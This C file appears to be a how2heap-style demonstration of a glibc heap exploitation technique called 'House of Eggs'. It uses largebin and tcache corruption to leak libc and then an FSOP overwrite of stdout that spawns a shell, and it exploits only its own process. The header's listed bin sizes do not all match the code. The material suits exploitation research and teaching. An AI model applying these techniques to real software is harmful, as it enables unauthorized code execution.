#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>


/* 
 * House of Eggs is an end-to-end primitive-to-RCE technique uses a UAF write primitive 
 * to achieve RCE via heap exploitation. 
 * 
 * It starts by increasing mmap_threshold to handle large allocations in the main arena/largebins without mmap interference. 
 * Then it allocates a large chunk that will later be hijacked because of its offset from the tcache fake chunk (the 'relative chunk'), 
 * which shares the same ASLR‑partially‑controlled second nibble (which is 2).
 * [This matches the House of Water newer small-bin variant]
 * 
 * The fake chunk uses the highest available tcache bins for its chunk-header fields:
 * 0x3c0 (prev_size), 0x3d0 (size), 0x340 (fd), 0x4f0 (bk), 0x400 (fd_nextsize), 0x410 (bk_nextsize). 
 * 
 * Then it allocates two more chunks - the first smaller than the 'relative chunk' the second larger,
 * so relative sits in the middle of the largebin linked list. 
 * 
 * It frees all three, sorts into largebins[MAX] by allocating a larger chunk, 
 * and hijacks the 'relative chunk' via LSB overwrites: 
 * fd/fd_nextsize=0x60 (first entry), bk/bk_nextsize=0x60 (last entry).
 * 
 * Allocating two chunks with sizes matching the first and last chunks in the largebin list 
 * unlinks them and overwrites the fake fd and bk with a libc largebins[MAX] pointer near stdout.
 * 
 * As a bonus, it also overwrites fd_nextsize and bk_nextsize with pointers back into the fake chunk 
 * inside the tcache structure, which gives the ability to control that region by allocating those chunks (a strong primitive).
 * 
 * Allocating from the 0x3e0 tcache bin (fake fd) overlaps stdout, making it easy to control its flags and _IO_write_base, 
 * and to force a pivoted read that leaks a libc address via stdout for the libc_base calculation.
 * 
 * Then, allocating the second libc pointer from the 0x3f0 tcache bin 
 * enables crafting a full FSOP attack and achieving reliable RCE.
 * 
 * |> House of Eggs by @4f3rg4n - CyberEggs <|
 */



#define PAGE_SIZE 0x1000
#define PREV_INUSE 1

#define MIN_LARGEST_ALLOC_SIZE (0x80000)
#define MIN_LARGEST_MALLOC_SIZE (0x80010)
#define INCREASE_MMAP_THRESHOLD_SIZE (0x80050)

/* The largest chunk, used to sort other chunks into the large bin. */
const unsigned int large_size = MIN_LARGEST_MALLOC_SIZE+0x40;

/* Large chunk sizes. */
const unsigned int start_size  = MIN_LARGEST_ALLOC_SIZE+0x30;
const unsigned int relative_chk_size = MIN_LARGEST_ALLOC_SIZE+0x20;
const unsigned int end_size    = MIN_LARGEST_ALLOC_SIZE+0x10;

const unsigned int mlstart_size  = MIN_LARGEST_MALLOC_SIZE+0x30;
const unsigned int mlrelative_chk_size_ = MIN_LARGEST_MALLOC_SIZE+0x20;
const unsigned int mlend_size    = MIN_LARGEST_MALLOC_SIZE+0x10;

/* Fake tcache chunk fields. */
const unsigned int fd_binsize = 0x3e0;
const unsigned int bk_binsize = 0x3f0;
const unsigned int fd_nextsize_binsize = 0x400;
const unsigned int bk_nextsize_binsize = 0x410;


struct _IO_FILE_plus {
  FILE file;
  const struct _IO_jump_t *vtable;
};


/*
 * Redirects stdout to a pipe, reads from the pipe into temp_buf, and then restores stdout.
 * It fills a caller-provided buffer with the data that was written to stdout.
 * Purpose: Leak libc addresses by capturing stdout output.
 */
void read_from_stdout(char* temp_buf) {
    int  stdout_bk; // FD for stdout backup
    int pipefd[2];

    stdout_bk = dup(fileno(stdout));
    pipe2(pipefd, 0);

    // Stdout now writes to the pipe.
    dup2(pipefd[1], fileno(stdout));
    fflush(stdout);
    close(pipefd[1]);
    dup2(stdout_bk, fileno(stdout)); // restore real stdout from backup

    read(pipefd[0], temp_buf, 100); 
}


/*
 * Resolves the offset of a symbol from the base of its shared object.
 */
unsigned long resolve_offset(const char* symbol_name) {
    Dl_info info;
    void *symbol_addr = dlsym(RTLD_DEFAULT, symbol_name);
    if (dladdr(symbol_addr, &info) == 0) {
        fprintf(stderr, "dladdr failed for symbol: %s\n", symbol_name);
        exit(EXIT_FAILURE);
    }
    return (unsigned long)symbol_addr - (unsigned long)info.dli_fbase;
}


int main(void) {
    void *_ = NULL;
    setbuf(stdin, NULL); 
    setbuf(stdout, NULL); 
    setbuf(stderr, NULL);


    /* * * * * * * * 
    * <<Phase one>> * * * * * * * * * * * * * * * * * * * * * * * * * * 
    * 1. Increase mmap_threshold to a large size (0x80050+).          *
    * 2. Allocate the relative chunk along with the other two chunks. *
    * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

    puts("");
    puts("/-----------\\\n"
         "| Phase one |\n"
         "| Missions: \\-----------------------------------------------\\\n"
         "| 1. Increase mmap_threshold to a large size (0x80050+).    |\n"
         "| 2. Allocate the relative chunk with the other two chunks. |\n"
         "\\-----------------------------------------------------------/");
    puts("");

    // Increase mmap_threshold to enable very large allocations in the main arena.
    void* large_chunk = malloc(INCREASE_MMAP_THRESHOLD_SIZE);
    free(large_chunk);
    printf("[mp] mmap_threshold increased by freeing a 0x%x-byte chunk\n", INCREASE_MMAP_THRESHOLD_SIZE);
    puts("");

    // Allocate MIN_LARGEST_ALLOC_SIZE chunks + guards (prevents consolidation).
    // 'relative_chunk' aligns with the tcache metadata page & first nibble (no brute force needed).
    void *relative_chunk = malloc(relative_chk_size); 
    printf("[malloc] Relative chunk:\t%p\n", relative_chunk);
    _ = malloc(0x18); // guard

    void *large_start = malloc(start_size); 
    printf("[malloc] Large-start chunk:\t%p\n", large_start);
    _ = malloc(0x18); // guard

    void *large_end = malloc(end_size); 
    printf("[malloc] Large-end chunk:\t%p\n", large_end);
    _ = malloc(0x18); // guard

    puts("");


    /* * * * * * * * 
    * <<Phase two>> * * * * * * * * * * * * * * * * * * * *
    * 1. Set fake chunk fd and fd_nextsize to large_end   *
    * 2. Set fake chunk bk and bk_nextsize to large_start *
    * * * * * * * * * * * * * * * * * * * * * * * * * * * */

    puts("");
    puts("/-----------\\\n"
         "| Phase two |\n"
         "| Missions: \\---------------------------------------------------------------------\\\n"
         "| 1. Set fake chunk fd and fd_nextsize to the *smallest* of the other two chunks. |\n"
         "| 2. Set fake chunk bk and bk_nextsize to the *largest* of the other two chunks.  |\n"
         "\\---------------------------------------------------------------------------------/");
    puts("");      

    // Craft fake tcache entries (fd, fd_nextsize, bk, bk_nextsize) that point to chunk headers.
    // This simulates an arbitrary free primitive where other chunks overlap the metadata of large_end and large_start.

    /* fd */
    *(long*)(large_end-0x18) = fd_binsize | PREV_INUSE; // Set fake size field for the overlapping large_end size
    free(large_end-0x10); // Free large_end to populate tcache[0x3e0]
    printf("[free] size: 0x3d0 @ %p --> 0x3e0 tcache bin (->\t fake fd \t\t<-)\n", large_end);

    /* fd_nextsize */
    *(long*)(large_end-0x18) = fd_nextsize_binsize | PREV_INUSE; // Set fake size field for the overlapping large_end size
    free(large_end-0x10); // Free large_end to populate tcache[0x400]
    printf("[free] size: 0x400 @ %p --> 0x410 tcache bin (->\t fake fd_nextsize \t<-)\n", large_end);

    *(long*)(large_end-0x8) = mlend_size | 1; // Restore large_end size (corrupted by tcache metadata)

    puts("");

    /* bk */
    *(long*)(large_start-0x18) = bk_binsize | PREV_INUSE; // Set fake size field for the overlapping large_start size
    free(large_start-0x10); // Free large_start to populate tcache[0x3f0]
    printf("[free] size: 0x3e0 @ %p --> 0x3f0 tcache bin (->\t fake bk \t\t<-)\n", large_start);

    /* bk_nextsize */
    *(long*)(large_start-0x18) = bk_nextsize_binsize | PREV_INUSE; // Set fake size field for the overlapping large_start size
    free(large_start-0x10); // Free large_start to populate tcache[0x400]
    printf("[free] size: 0x3f0 @ %p --> 0x400 tcache bin (->\t fake bk_nextsize \t<-)\n", large_start);

    *(long*)(large_start-0x8) = mlstart_size | 1; // Restore large_start size (corrupted by tcache metadata)

    puts("");
    puts("::: Fake chunk :::");
    printf(": fd          -> %p (large_end)\n", large_end);
    printf(": bk          -> %p (large_start)\n", large_start);
    printf(": fd_nextsize -> %p (large_end)\n", large_end);
    printf(": bk_nextsize -> %p (large_start)\n", large_start);
    puts("::::::::::::::::::");

    puts("");
    

    /* * * * * * * * * 
    * <<Phase three>> * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * * * * 
    * 1. Free all three chunks (order does not matter, because the largebin list sorts them by size).    *
    * 2. Link the fake chunk into the middle of the largebin and nextsize lists by overwriting the LSBs: *
    *    - Overwrite large_start fd and fd_nextsize LSBs with 0x60.                                      *
    *    - Overwrite large_end bk and bk_nextsize LSBs with 0x60.                                        *
    * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

    puts("");
    puts("/-------------\\\n"
         "| Phase three |\n"
         "| Missions:   \\----------------------------------------------------------------------------------------\\\n"
         "| 1. Free all three chunks (order does not matter; the largebin list sorts them by size).              |\n"
         "| 2. Link the fake chunk into the middle of the largebin/nextsize lists by overwriting LSBs with 0x60. |\n"
         "\\------------------------------------------------------------------------------------------------------/");
    puts("");    
    
    /* Sort into largest large bin */
    free(large_start);
    puts("[free] large_start");
    free(relative_chunk);
    puts("[free] relative_chunk");
    free(large_end);
    puts("[free] large_end");
    printf("[malloc] launch a larger allocation of size 0x%x to sort chunks into the largebin\n", large_size);

    large_chunk = malloc(large_size);
    puts("[0x80000-∞] large bin:");
    printf("%p(large_start) —▸ %p(relative_chunk) —▸ %p(large_end) —▸ (main_arena+2096) ◂— %p(large_start)\n", large_start, relative_chunk, large_end, large_start);

    puts("");

    /* Hijack linking process */ // 0x60 - The offset of the fake chunk on the tcache
    /*VULNERABILITY*/
    *((char*)large_start+0x00) = 0x60;
    *((char*)large_start+0x10) = 0x60;
    
    *((char*)large_end+0x08) = 0x60;
    *((char*)large_end+0x18) = 0x60;
    /*VULNERABILITY*/

    puts("[VULNERABILITY] Hijack a fake chunk in tcache by corrupting the LSBs of large_start (fd, fd_nextsize) and large_end (bk, bk_nextsize).");

    // By unlinking the start and end chunks from the largebin:
    // - Obtain two libc pointers in the fake chunk's fd & bk.
    // - Obtain two heap pointers into tcache via fd_nextsize & bk_nextsize.
    _ = malloc(end_size);
    _ = malloc(start_size);
    puts("Trigger two safe unlinks to write two libc pointers and two heap pointers into tcache.");

    puts("");


    /*
    * Now there are two libc pointers in tcache that both overlap the stdout FILE structure,
    * along with two additional heap pointers that overlap part of the tcache bins.
    * Use the first libc pointer to get a libc leak via the stdout FILE structure,
    * and the second libc pointer to run an FSOP attack for reliable RCE.
    */

    ////////////////////////

    puts("");

    puts("/-------\\\n"
         "| BONUS |\n"
         "\\-------/");
      puts("");    
    puts("[BONUS] Two heap pointers point into the tcache structure (inside tcache bins):");

    /* BONUS - Two heap pointers overlap tcache bins */
    /* hijacking tcache bins 0x3c0, 0x3d0, 0x3e0, 0x3f0, 0x400 and 0x410;
    * p1 - first overlap pointer, allocated from the fd_nextsize field of the fake chunk.
    * p2 - second overlap pointer, allocated from the bk_nextsize field of the fake chunk.
    */
    
    void *p1_tcache_chunk = malloc(fd_nextsize_binsize-0x10);
    printf("tcache_overlap_chunk 1 @ %p\n", p1_tcache_chunk);
    void *p2_tcache_chunk = malloc(bk_nextsize_binsize-0x10);
    printf("tcache_overlap_chunk 2 @ %p\n", p2_tcache_chunk);

    /*
     * An article that explains how to leverage this primitive and reuse these pointers to access
     * and overwrite these tcache bins as many times as needed can be found here.
     */

    puts("");

    ////////////////////////


   /* * * * * * * * * 
    * <<Phase four>> * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
    * 1. Leak a libc pointer using the first libc address placed in tcache bin 0x3e0 (fake fd).            *
    * 2. Achieve RCE by hijacking control flow with an FSOP attack that overlaps the stdout FILE structure *
    *    using the second pointer placed in tcache bin 0x3f0 (fake bk).                                    *
     * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

    puts("");
    puts("/-------------\\\n"
         "| Phase four  |\n"
         "| Missions:   \\---------------------------------------------------------------------------------------------------------\\\n"
         "| 1. Leak a libc pointer using the first libc address placed in tcache bin 0x3e0 (fake fd).                             |\n"
         "| 2. Achieve RCE by hijacking control flow with an FSOP attack that overlaps the stdout FILE structure using the second |\n"
         "|    pointer placed in tcache bin 0x3f0 (fake bk).                                                                      |\n"
         "\\-----------------------------------------------------------------------------------------------------------------------/");
    puts("");        


    /* * * * * * * * * * * * * * * * * * * * * * *\
    * Use first libc pointer --> get a libc leak *
    \* * * * * * * * * * * * * * * * * * * * * * */

    puts("Use the first libc pointer from tcache bin 0x3e0:");

    /* 0x100 bytes of overlap above stdout */
    // Allocate from the fd of the fake chunk, 0x2d0 offset to the _IO_FILE stdout structure.
    FILE* stdout_overlap = (FILE*)((unsigned long)malloc(fd_binsize-0x10)+0x2d0); 
    assert(stdout_overlap == stdout);
    printf("Overlapped stdout at %p\n", stdout_overlap);
    
    // Avoid seeking stdout.
    /*
    if (fp->_flags & _IO_IS_APPENDING) { // Avoid seeking
        fp->_offset = _IO_pos_BAD;       
    } else if (fp->_IO_read_end != fp->_IO_write_base) {
     ...
     ..  // Seeking stdout
    */
    stdout_overlap->_flags |= 0x1000; // _IO_IS_APPENDING

    // Overwrite _IO_write_base LSB with NULL; this forces a libc leak.
    *(char*)&(stdout_overlap->_IO_write_base) = 0x00;

    // Read the leaked libc address from stdout.
    char* temp_buf = alloca(PAGE_SIZE);
    read_from_stdout(temp_buf);
    void* libc_leak = 0;
    memcpy(&libc_leak, temp_buf, 8);

    // Calculate libc base from the leaked address.
    unsigned long stdout_offset = resolve_offset("_IO_2_1_stdout_");
    void* libc_base = (void*)((unsigned long)libc_leak - (stdout_offset+132));
    assert(((unsigned long)libc_base & 0xfff) == 0);
    printf("libc base @ %p\n", libc_base);

    puts("");


    /* * * * * * * * * * * * * * * * * * * * * * * * * *\
    * Use second libc pointer --> leverage FSOP attack *
    \* * * * * * * * * * * * * * * * * * * * * * * * * */

    puts("Use the second libc pointer from tcache bin 0x3f0:");

    // Resolve offsets of system and _IO_wfile_jumps.
    unsigned long system_offset = resolve_offset("system");
    unsigned long wfile_jumps = resolve_offset("_IO_wfile_jumps");

    // Create a fake _IO_FILE_plus structure that triggers system("sh")
    // by crafting fake _wide_data and _wide_vtable structures.
    FILE* payload = (FILE*)alloca(sizeof(struct _IO_FILE_plus));
    memset(payload, '\x00', sizeof(struct _IO_FILE_plus));

    // Function argument: "sh"
    memcpy(&(payload->_flags), "  sh\x00", 5); 

    /* fp->_mode <= 0 */ 
    payload->_mode = 0;

    /* stdout->_IO_write_ptr > stdout->_IO_write_base */
    payload->_IO_write_base = 0;
    payload->_IO_write_ptr = (char*)1;

    /* stdout->_lock = pointer_to_writable_area->0 */
    payload->_lock = (void*)((unsigned long)stdout_overlap - 0x10);

    // Target function: system()
    payload->_chain = (FILE*)((unsigned long)libc_base + system_offset); 
    payload->_codecvt = (struct _IO_codecvt*)((unsigned long)stdout_overlap);

    // wide data vtable
    payload->_wide_data = (struct _IO_wide_data *)((unsigned long)stdout_overlap - 0x48);

    // stdout structure vtable
    ((struct _IO_FILE_plus*)payload)->vtable = (const struct _IO_jump_t *)((unsigned long)libc_base + wfile_jumps);

    printf("Corrupting stdout @ %p with a fake _IO_FILE_plus struct\n", stdout_overlap);
    printf("The next stdout flush will trigger system('/bin/sh')...\n");
    puts("Press Enter to continue...");

    // Allocate from the bk of the fake chunk, 0x2d0 offset to the _IO_FILE stdout structure.
    FILE* stdout_overlap_FSOP = (FILE*)((unsigned long)malloc(bk_binsize-0x10)+0x2d0); 

    // Overwrite stdout with the fake _IO_FILE_plus structure.
    memcpy((struct _IO_FILE_plus*)stdout_overlap_FSOP, (struct _IO_FILE_plus*)payload, sizeof(struct _IO_FILE_plus));
    
    getchar(); // Wait for user input before triggering system('/bin/sh')...
    puts("");
}
